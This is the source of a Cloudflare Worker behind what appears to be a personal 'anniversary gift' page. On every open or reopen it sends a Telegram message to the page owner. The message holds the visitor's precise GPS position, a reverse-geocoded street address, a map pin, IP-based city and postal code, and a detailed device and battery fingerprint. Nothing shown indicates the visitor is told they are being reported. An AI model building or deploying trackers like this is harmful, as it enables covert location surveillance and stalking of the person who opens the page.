/**
 * Cloudflare Worker — anniversary visitor notifier.
 *
 * Receives one JSON payload per visit/reopen from the site's frontend
 * tracker, enriches it with Cloudflare request metadata (request.cf,
 * CF-* and Client-Hints headers) plus an OpenStreetMap reverse-geocode
 * of any GPS fix, and sends ONE formatted Telegram message.
 *
 * It is self-sufficient: Device / OS / Browser / Engine / User-Agent /
 * Origin / timezone are recovered from the request itself when the page
 * does not supply them, and BOTH the current and the older field names
 * are accepted — so the message is complete no matter which cached
 * version of the site a device is running.
 *
 * Secrets live ONLY in the Worker environment, never in the message:
 *   - TELEGRAM_BOT_TOKEN
 *   - TELEGRAM_CHAT_ID
 * The raw visitor IP is used only as a throttle key and is NEVER sent
 * to Telegram. Precise GPS is only ever the browser's permission-based
 * fix; network location is Cloudflare's approximate IP guess.
 */

const ALLOWED_ORIGINS = ["https://nassaranwar-boop.github.io"];
const WORKER_VERSION = "2026-09-20-FULL-9";

const RECENT = new Map();
const RATE_WINDOW_MS = 4000;

export default {
  async fetch(request, env, ctx) {
    const origin = request.headers.get("Origin") || "";
    const referer = request.headers.get("Referer") || "";
    const cors = corsHeaders(origin);

    // Preflight.
    if (request.method === "OPTIONS") return new Response(null, { status: 204, headers: cors });

    // A plain GET is a health check, so you can open the URL to confirm the deploy.
    if (request.method === "GET") return json({ ok: true, version: WORKER_VERSION, hint: "POST JSON to log a visit" }, 200, cors);

    if (request.method !== "POST") return json({ ok: false, error: "method_not_allowed" }, 405, cors);

    // Allow the site by Origin, or by Referer when a privacy mode strips Origin.
    const okOrigin = ALLOWED_ORIGINS.includes(origin)
      || (!origin && ALLOWED_ORIGINS.some(o => referer.indexOf(o) === 0));
    if (!okOrigin) return json({ ok: false, error: "forbidden_origin" }, 403, cors);

    // Parse JSON regardless of the declared content-type (sendBeacon and some
    // browsers send text/plain); reject only if it genuinely is not JSON.
    let body;
    try { body = await request.json(); }
    catch (e) {
      try { body = JSON.parse(await request.text()); }
      catch (e2) { return json({ ok: false, error: "invalid_json" }, 400, cors); }
    }
    if (!body || typeof body !== "object" || Array.isArray(body))
      return json({ ok: false, error: "invalid_payload" }, 400, cors);

    // Light rate limit (per edge isolate; best-effort abuse guard only).
    const key = request.headers.get("CF-Connecting-IP") || "anon";
    const now = Date.now();
    const prev = RECENT.get(key) || 0;
    RECENT.set(key, now);
    if (RECENT.size > 500) RECENT.clear();
    if (now - prev < RATE_WINDOW_MS) return json({ ok: true, throttled: true }, 202, cors);

    if (!env.TELEGRAM_BOT_TOKEN || !env.TELEGRAM_CHAT_ID)
      return json({ ok: false, error: "server_not_configured" }, 500, cors);

    const cf = request.cf || {};
    const headers = request.headers;

    let message;
    try { message = await buildMessage(body, cf, headers); }
    catch (e) { message = "🔔 ANNIVERSARY GIFT OPENED\n(A visit arrived but formatting failed.)\nWorker: " + WORKER_VERSION; }

    const sent = await sendTelegram(env, message);
    if (!sent.ok) return json({ ok: false, error: "telegram_failed", status: sent.status, detail: sent.desc }, 502, cors);

    // A tappable map pin, when GPS was shared (best-effort; never fails the call).
    try {
      const g = body.gps;
      if (g && g.available && typeof g.latitude === "number" && typeof g.longitude === "number") {
        const loc = fetch(`https://api.telegram.org/bot${env.TELEGRAM_BOT_TOKEN}/sendLocation`, {
          method: "POST", headers: { "Content-Type": "application/json" },
          body: JSON.stringify({
            chat_id: env.TELEGRAM_CHAT_ID,
            latitude: g.latitude, longitude: g.longitude,
            horizontal_accuracy: (typeof g.accuracy === "number" ? Math.min(1500, Math.max(0, g.accuracy)) : undefined)
          })
        }).catch(() => {});
        if (ctx && ctx.waitUntil) ctx.waitUntil(loc); else await loc;
      }
    } catch (e) {}

    const resp = json({ ok: true, version: WORKER_VERSION }, 200, cors);
    resp.headers.set("Accept-CH",
      "Sec-CH-UA-Platform-Version, Sec-CH-UA-Model, Sec-CH-UA-Full-Version-List, Sec-CH-UA-Arch, Sec-CH-UA-Bitness");
    return resp;
  }
};

/* Send to Telegram as HTML; if Telegram rejects the entities (e.g. a long
   message truncated mid-tag), resend the same text as plain text so the
   alert is never lost. */
async function sendTelegram(env, text) {
  const url = `https://api.telegram.org/bot${env.TELEGRAM_BOT_TOKEN}/sendMessage`;
  async function post(payload) {
    try {
      const r = await fetch(url, { method: "POST", headers: { "Content-Type": "application/json" }, body: JSON.stringify(payload) });
      let desc = "";
      if (!r.ok) { try { const j = await r.json(); desc = (j && j.description) || ""; } catch (e) {} }
      return { ok: r.ok, status: r.status, desc };
    } catch (e) {
      return { ok: false, status: 0, desc: "unreachable" };
    }
  }
  const first = await post({ chat_id: env.TELEGRAM_CHAT_ID, text, parse_mode: "HTML", disable_web_page_preview: true });
  if (first.ok) return first;
  // Retry as plain text (strip tags + unescape) — covers any HTML-parse error.
  const plain = text.replace(/<[^>]*>/g, "").replace(/&lt;/g, "<").replace(/&gt;/g, ">").replace(/&amp;/g, "&");
  const second = await post({ chat_id: env.TELEGRAM_CHAT_ID, text: plain, disable_web_page_preview: true });
  return second.ok ? second : first;
}

/* ---------------- http helpers ---------------- */

function corsHeaders(origin) {
  const allow = ALLOWED_ORIGINS.includes(origin) ? origin : ALLOWED_ORIGINS[0];
  return {
    "Access-Control-Allow-Origin": allow,
    "Access-Control-Allow-Methods": "POST, OPTIONS",
    "Access-Control-Allow-Headers": "Content-Type",
    "Access-Control-Max-Age": "86400",
    "Vary": "Origin"
  };
}
function json(obj, status, cors) {
  return new Response(JSON.stringify(obj), { status,
    headers: { "Content-Type": "application/json", ...cors } });
}

/* ---------------- value helpers ---------------- */

function esc(v) {
  if (v === null || v === undefined || v === "") return "";
  return String(v).replace(/&/g, "&amp;").replace(/</g, "&lt;").replace(/>/g, "&gt;");
}
function val(v) {
  if (v === null || v === undefined || v === "") return "Unavailable";
  return esc(v);
}
function first(...xs) {
  for (const x of xs) if (x !== null && x !== undefined && x !== "") return x;
  return null;
}
function yesno(v) { return v === true ? "Yes" : v === false ? "No" : "Unavailable"; }
function num(v, d) {
  if (typeof v !== "number" || !isFinite(v)) return null;
  return d === undefined ? v : Number(v.toFixed(d));
}
function dur(ms) {
  const s = Math.round(ms / 1000);
  if (s < 60) return s + "s";
  const m = Math.floor(s / 60), r = s % 60;
  if (m < 60) return m + "m " + r + "s";
  const h = Math.floor(m / 60);
  return h + "h " + (m % 60) + "m";
}
const DIV = "\n━━━━━━━━━━━━━━━━━━\n";

/* ---------------- server-side UA parsing (fallback) ---------------- */

function parseDevice(ua, maxTouch) {
  if (/iPad/i.test(ua) || (/Macintosh/i.test(ua) && maxTouch > 1)) return "iPad";
  if (/iPhone/i.test(ua)) return "iPhone";
  if (/iPod/i.test(ua)) return "iPod";
  if (/Android/i.test(ua)) return /Mobile/i.test(ua) ? "Android phone" : "Android tablet";
  if (/Windows/i.test(ua)) return "Windows PC";
  if (/Macintosh|Mac OS X/i.test(ua)) return "Mac";
  if (/CrOS/i.test(ua)) return "Chromebook";
  if (/Linux/i.test(ua)) return "Linux";
  return "Unknown";
}
function parseOS(ua, maxTouch) {
  const isIOS = /iPhone|iPad|iPod/i.test(ua) || (/Macintosh/i.test(ua) && maxTouch > 1);
  if (isIOS) {
    const label = (/iPad/i.test(ua) || (/Macintosh/i.test(ua) && maxTouch > 1)) ? "iPadOS" : "iOS";
    const m = ua.match(/CPU (?:iPhone )?OS (\d+)[._](\d+)(?:[._](\d+))?/i);
    if (m) return label + " " + m[1] + "." + m[2] + "." + (m[3] || "0");
    return label + " — exact version hidden by WebKit";
  }
  const a = ua.match(/Android ([\d.]+)/i);
  if (a) return "Android " + a[1];
  if (/Android/i.test(ua)) return "Android — version not exposed";
  if (/Windows NT 10\.0/i.test(ua)) return "Windows 10/11";
  if (/Windows NT 6\.3/i.test(ua)) return "Windows 8.1";
  if (/Windows/i.test(ua)) return "Windows";
  if (/CrOS/i.test(ua)) return "ChromeOS";
  const mac = ua.match(/Mac OS X (\d+[._]\d+(?:[._]\d+)?)/i);
  if (mac) return "macOS " + mac[1].replace(/_/g, ".");
  if (/Macintosh/i.test(ua)) return "macOS";
  if (/Linux/i.test(ua)) return "Linux";
  return "Unknown";
}
function grab(ua, re) { const m = ua.match(re); return m && m[1] ? m[1] : null; }
function parseBrowser(ua) {
  let v;
  if ((v = grab(ua, /CriOS\/([\d.]+)/i)))  return { name: "Chrome",  version: v };
  if ((v = grab(ua, /FxiOS\/([\d.]+)/i)))  return { name: "Firefox", version: v };
  if ((v = grab(ua, /EdgiOS\/([\d.]+)/i))) return { name: "Edge",    version: v };
  if ((v = grab(ua, /OPiOS\/([\d.]+)/i)))  return { name: "Opera",   version: v };
  if ((v = grab(ua, /Edg(?:A|W)?\/([\d.]+)/i)))    return { name: "Edge",             version: v };
  if ((v = grab(ua, /OPR\/([\d.]+)/i)))            return { name: "Opera",            version: v };
  if ((v = grab(ua, /SamsungBrowser\/([\d.]+)/i))) return { name: "Samsung Internet", version: v };
  if ((v = grab(ua, /Firefox\/([\d.]+)/i)))        return { name: "Firefox",          version: v };
  if ((v = grab(ua, /Chrome\/([\d.]+)/i)))         return { name: "Chrome",           version: v };
  if (/Safari\//i.test(ua)) return { name: "Safari", version: grab(ua, /Version\/([\d.]+)/i) || "Not exposed by browser" };
  return { name: "Unknown", version: "Not exposed by browser" };
}
function parseEngine(ua) {
  if (/Firefox/i.test(ua) && /Gecko\/\d/i.test(ua)) return "Gecko";
  if (/iPhone|iPad|iPod/i.test(ua)) return "WebKit";
  if (/Edg|OPR|Chrome|Chromium|SamsungBrowser/i.test(ua)) return "Blink";
  if (/Safari/i.test(ua) && /AppleWebKit/i.test(ua)) return "WebKit";
  if (/AppleWebKit/i.test(ua)) return "WebKit";
  return "Unknown";
}

/* ---------------- reverse geocode (OpenStreetMap) ---------------- */

async function reverseGeocode(lat, lon) {
  try {
    const url = "https://nominatim.openstreetmap.org/reverse?format=jsonv2&zoom=18&addressdetails=1"
      + "&lat=" + encodeURIComponent(lat) + "&lon=" + encodeURIComponent(lon);
    const ctrl = new AbortController();
    const t = setTimeout(() => ctrl.abort(), 3000);
    const r = await fetch(url, {
      signal: ctrl.signal,
      headers: { "User-Agent": "anniversary-gift-notifier/1.0 (personal use)", "Accept": "application/json" }
    });
    clearTimeout(t);
    if (!r.ok) return null;
    const j = await r.json();
    if (!j || !j.address) return { display: j && j.display_name ? j.display_name : null, a: {} };
    return { display: j.display_name || null, a: j.address };
  } catch (e) { return null; }
}

/* ---------------- message ---------------- */

async function buildMessage(b, cf, headers) {
  const H = n => headers.get(n);
  const isReopen = b.visitType === "reopen" || b.visitType === "reopening";
  let out = "<b>" + (isReopen ? "🔁 ANNIVERSARY GIFT REOPENED" : "🔔 ANNIVERSARY GIFT OPENED") + "</b>\n";

  // ---- request-derived essentials (work even for an old cached page) ----
  const ua = first(b.userAgent, H("User-Agent")) || "";
  const maxTouch = typeof b.maxTouchPoints === "number" ? b.maxTouchPoints : 0;
  const device  = first(b.device, b.deviceType) || parseDevice(ua, maxTouch);
  const os      = first(b.os, b.operatingSystem) || parseOS(ua, maxTouch);
  const parsedB = parseBrowser(ua);
  const browser = first(b.browser, parsedB.name);
  const browserV = first(b.browserVersion, parsedB.version);
  const engine  = first(b.engine, parseEngine(ua));
  const tz      = first(b.timezone, b.browserTimezone, cf.timezone);
  const origin  = first(b.origin, H("Origin"));
  const referrer = (b.referrer && b.referrer !== "Direct") ? b.referrer : null;
  const e2 = (b.extra && typeof b.extra === "object") ? b.extra : {};

  // ---- VISIT ----
  out += "\n🟢 <b>VISIT</b>\n";
  out += "Type: " + (isReopen ? "REOPEN / RETURN" : "INITIAL VISIT") + (b.queuedResend ? " (delayed resend)" : "") + "\n";
  out += "Time (UTC): " + esc(new Date().toISOString()) + "\n";
  if (b.localTime) out += "Client time: " + val(b.localTime) + "\n";
  if (b.sessionId) out += "Session: " + val(b.sessionId) + "\n";
  if (typeof b.previousDwellMs === "number" && b.previousDwellMs > 0)
    out += "Previous visit stayed: " + dur(b.previousDwellMs) + "\n";

  // ---- DEVICE ----
  out += DIV + "📱 <b>DEVICE</b>\n";
  out += "Device: " + val(device) + "\n";
  out += "OS: " + val(os) + "\n";
  out += "Browser: " + val(browser) + "\n";
  out += "Browser version: " + val(browserV) + "\n";
  out += "Engine: " + val(engine) + "\n";
  out += "Touchscreen: " + yesno(b.touchscreen) + "\n";
  out += "Max touch points: " + (typeof b.maxTouchPoints === "number" ? b.maxTouchPoints : "Unavailable") + "\n";

  // ---- CLIENT HINTS (Chromium high-entropy, when present) ----
  const chPlat = H("Sec-CH-UA-Platform"), chPlatV = H("Sec-CH-UA-Platform-Version"),
        chModel = H("Sec-CH-UA-Model"), chFull = H("Sec-CH-UA-Full-Version-List"),
        chMobile = H("Sec-CH-UA-Mobile"), chArch = H("Sec-CH-UA-Arch"), chBit = H("Sec-CH-UA-Bitness");
  if (chPlat || chModel || chFull || chPlatV) {
    out += DIV + "🧷 <b>CLIENT HINTS</b>\n";
    out += "Platform: " + val(chPlat ? chPlat.replace(/"/g, "") : null)
         + (chPlatV ? " " + chPlatV.replace(/"/g, "") : "") + "\n";
    if (chModel && chModel.replace(/"/g, "")) out += "Model: " + val(chModel.replace(/"/g, "")) + "\n";
    if (chArch) out += "Arch: " + val(chArch.replace(/"/g, "")) + (chBit ? " " + chBit.replace(/"/g, "") + "-bit" : "") + "\n";
    out += "Mobile: " + (chMobile === "?1" ? "Yes" : chMobile === "?0" ? "No" : "Unavailable") + "\n";
    if (chFull) out += "Versions: " + val(chFull.replace(/"/g, "")) + "\n";
  }

  // ---- DISPLAY ----
  out += DIV + "📐 <b>DISPLAY</b>\n";
  out += "Screen: " + val(b.screenWidth) + " × " + val(b.screenHeight) + "\n";
  out += "Viewport: " + val(b.viewportWidth) + " × " + val(b.viewportHeight) + "\n";
  out += "Orientation: " + val(b.orientation) + (typeof e2.orientationAngle === "number" ? " (" + e2.orientationAngle + "°)" : "") + "\n";
  out += "Device pixel ratio: " + val(b.devicePixelRatio) + "\n";
  if (e2.availWidth) out += "Usable screen: " + val(e2.availWidth) + " × " + val(e2.availHeight) + "\n";
  if (typeof e2.colorDepth === "number") out += "Color depth: " + e2.colorDepth + "-bit\n";
  if (typeof e2.refreshHz === "number") out += "Refresh rate: ~" + e2.refreshHz + " Hz\n";
  if (e2.colorScheme) out += "Color scheme: " + esc(e2.colorScheme) + "\n";
  if (e2.reducedMotion === true) out += "Reduced motion: Yes\n";
  if (e2.hdr === true) out += "HDR display: Yes\n";

  const hasHw = e2.battery || typeof e2.deviceMemory === "number" || typeof e2.cpuCores === "number" || typeof e2.storageQuotaMB === "number";
  if (hasHw) {
    out += DIV + "🔋 <b>HARDWARE</b>\n";
    if (e2.battery && typeof e2.battery.level === "number")
      out += "Battery: " + e2.battery.level + "%" + (e2.battery.charging === true ? " (charging)" : e2.battery.charging === false ? " (on battery)" : "") + "\n";
    if (typeof e2.deviceMemory === "number") out += "RAM: ~" + e2.deviceMemory + " GB\n";
    if (typeof e2.cpuCores === "number") out += "CPU cores: " + e2.cpuCores + "\n";
    if (typeof e2.storageQuotaMB === "number")
      out += "Storage quota: " + (e2.storageQuotaMB >= 1024 ? (e2.storageQuotaMB / 1024).toFixed(1) + " GB" : e2.storageQuotaMB + " MB")
           + (typeof e2.storageUsageMB === "number" ? " (used " + e2.storageUsageMB + " MB)" : "") + "\n";
  }

  // ---- PRECISE LOCATION (browser GPS only) ----
  out += DIV + "📍 <b>PRECISE LOCATION</b> (browser GPS)\n";
  const gps = b.gps || {};
  if (gps.available && typeof gps.latitude === "number" && typeof gps.longitude === "number") {
    const lat = num(gps.latitude, 6), lon = num(gps.longitude, 6);
    out += "Status: AVAILABLE\n";
    out += "Latitude: " + lat + "\n";
    out += "Longitude: " + lon + "\n";
    out += "Accuracy: " + (num(gps.accuracy, 0) !== null ? "±" + num(gps.accuracy, 0) + " m" : "Unavailable") + "\n";
    out += "Altitude: " + (num(gps.altitude, 1) !== null ? num(gps.altitude, 1) + " m" : "Unavailable") + "\n";
    out += "Altitude accuracy: " + (num(gps.altitudeAccuracy, 0) !== null ? "±" + num(gps.altitudeAccuracy, 0) + " m" : "Unavailable") + "\n";
    out += "Heading: " + (num(gps.heading, 0) !== null ? num(gps.heading, 0) + "°" : "Unavailable") + "\n";
    out += "Speed: " + (num(gps.speed, 1) !== null ? num(gps.speed, 1) + " m/s" : "Unavailable") + "\n";
    if (typeof gps.samples === "number") out += "Samples taken: " + gps.samples + "\n";
    out += "Google Maps: https://www.google.com/maps?q=" + lat + "," + lon + "\n";

    // Reverse-geocode to a human address (best-effort, never blocks).
    const geo = await reverseGeocode(lat, lon);
    if (geo) {
      const a = geo.a || {};
      out += "\n<b>Approx address</b>\n";
      if (geo.display) out += esc(geo.display) + "\n";
      const line = [a.road, a.neighbourhood || a.suburb, a.city || a.town || a.village,
                    a.state, a.postcode, a.country].filter(Boolean).join(", ");
      if (line && line !== geo.display) out += esc(line) + "\n";
    }
  } else {
    out += "Status: UNAVAILABLE\n";
    out += "Reason: " + val(gps.reason) + "\n";
    out += "Permission: " + val(b.locationPermission) + "\n";
  }

  // ---- NETWORK LOCATION (Cloudflare, approximate, NOT GPS) ----
  out += DIV + "🌍 <b>NETWORK / IP-BASED LOCATION</b> (approximate)\n";
  out += "Country: " + val(first(cf.country, H("CF-IPCountry"))) + (cf.isEUCountry === "1" ? " (EU)" : "") + "\n";
  out += "Continent: " + val(cf.continent) + "\n";
  out += "Region: " + val(cf.region) + "\n";
  out += "Region code: " + val(cf.regionCode) + "\n";
  out += "City: " + val(cf.city) + "\n";
  out += "Postal code: " + val(cf.postalCode) + "\n";
  out += "Metro code: " + val(cf.metroCode) + "\n";
  out += "Timezone: " + val(cf.timezone) + "\n";
  out += "Approx lat/lon: " + val(cf.latitude) + ", " + val(cf.longitude) + "\n";
  out += "ASN: " + (cf.asn ? "AS" + cf.asn : "Unavailable") + "\n";
  out += "Organization: " + val(cf.asOrganization) + "\n";

  // ---- CONNECTION ----
  const c = b.connection || {};
  out += DIV + "📡 <b>CONNECTION</b>\n";
  out += "Type: " + val(c.type) + "\n";
  out += "Effective type: " + val(c.effectiveType) + "\n";
  out += "Downlink: " + (typeof c.downlink === "number" ? c.downlink + " Mbps" : "Unavailable") + "\n";
  const rtt = first(typeof c.rtt === "number" ? c.rtt : null, cf.clientTcpRtt);
  out += "RTT: " + (typeof rtt === "number" ? rtt + " ms" : "Unavailable")
       + (typeof c.rtt !== "number" && typeof cf.clientTcpRtt === "number" ? " (network, via Cloudflare)" : "") + "\n";
  out += "Save data: " + yesno(c.saveData) + "\n";

  // ---- LANGUAGE & TIME ----
  out += DIV + "🗣 <b>LANGUAGE & TIME</b>\n";
  out += "Language: " + val(first(b.language, H("Accept-Language") ? H("Accept-Language").split(",")[0] : null)) + "\n";
  out += "Languages: " + val((b.languages || []).join(", ") || (H("Accept-Language") || "")) + "\n";
  out += "Browser timezone: " + val(tz) + "\n";

  // ---- SOURCE ----
  out += DIV + "🔗 <b>SOURCE</b>\n";
  out += "Referrer: " + val(referrer || "Direct / none") + "\n";
  out += "Origin: " + val(origin) + "\n";
  out += "Page: " + val(b.page) + "\n";

  // ---- USER AGENT ----
  out += DIV + "🌐 <b>USER AGENT</b>\n" + val(ua) + "\n";

  // ---- CLOUDFLARE / TECH (no IP) ----
  const ray = H("CF-Ray") || "";
  const colo = ray.includes("-") ? ray.split("-")[1] : null;
  out += DIV + "☁️ <b>CLOUDFLARE</b>\n";
  out += "CF-Ray: " + val(ray) + "\n";
  out += "Edge datacenter: " + val(colo) + "\n";
  out += "HTTP: " + val(cf.httpProtocol) + "\n";
  out += "TLS: " + val(cf.tlsVersion) + (cf.tlsCipher ? " (" + esc(cf.tlsCipher) + ")" : "") + "\n";

  // ---- META ----
  out += DIV + "🧩 <b>META</b>\n";
  out += "Tracker: " + val(first(b.trackerVersion, "legacy page (pre-FULL-6, parsed server-side)")) + "\n";
  out += "Worker: " + WORKER_VERSION + "\n";
  out += "Permission state: " + val(b.locationPermission) + "\n";

  if (out.length > 4090) {
    let cut = out.lastIndexOf("\n", 4000);
    if (cut < 3000) cut = 4000;
    out = out.slice(0, cut) + "\n… (truncated)";
  }
  return out;
}
